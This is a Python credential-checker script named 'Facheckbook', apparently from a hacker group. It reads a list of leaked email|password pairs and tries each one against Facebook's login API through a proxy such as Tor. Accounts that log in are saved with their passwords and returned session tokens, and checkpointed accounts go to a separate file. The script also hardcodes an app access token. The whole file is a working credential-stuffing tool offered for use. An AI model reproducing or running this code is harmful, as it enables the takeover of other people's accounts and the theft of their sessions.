#!/usr/bin/python

import requests, sys, json, re
access_token = "350685531728|62f8ce9f74b12f84c123cc23437a4a32" #Your Access Token

def login_fb(email, password,access_token,proxy):
	proxy = {
	'http':proxy,
	'https':proxy,
	}

	data = {
	'email':email,
	'password':password,
	'access_token':access_token,
	'locale':'US',
	'format':'json',
	}

	r = requests.post("https://api.facebook.com/method/auth.login", data=data, proxies=proxy)
	x = json.loads(r.text)
	return(x)

def banner():
	print('''
 .................... ..................
 .    Facheckbook   . ... by FilthyRoot ..........
 . Facebook Account . .. Jogjakarta Hacker Rulez ......
 ...... Checker ..... . ..........................
	''')

if(len(sys.argv)) < 3:
	banner()
	print('''Usage: python3 fb.py [list.txt] [proxy:port]
       format - {email}|{password}
       proxy  - {proxy_ip}:{port} or socks5://{proxy_ip}:{port}

       example : python3 fb.py list.txt "socks5://127.0.0.1:9050"''')
else:
	banner()
	proxy = sys.argv[2]
	f = open(sys.argv[1], "r")
	x = f.read().split("\n")

	for i in x:
		try:
			z = i.split("|")
			email = z[0]
			password = z[1]
		except:
			pass
		#print("Email : " + email + "\nPassword : " + password)
		try:
			login = login_fb(email,password,access_token,proxy)
			if login['access_token']:
				print("[+] LIVE => " + email)
				f = open("result_live.txt","a")
				f.write(email + ":" + password + "\n")
				f.write(login + "\n\n")
				f.close()
		except:
			if login['error_code'] == 405:
				print("[*] CHECKPOINT " + email)
				f = open("result_checkpoint.txt","a")
				f.write(email + ":" + password + "\n")
				f.close()
			elif login['error_code'] == 401:
				print('[x] INVALID => ' + email)
			else:
				print("[-] DEAD => " + email)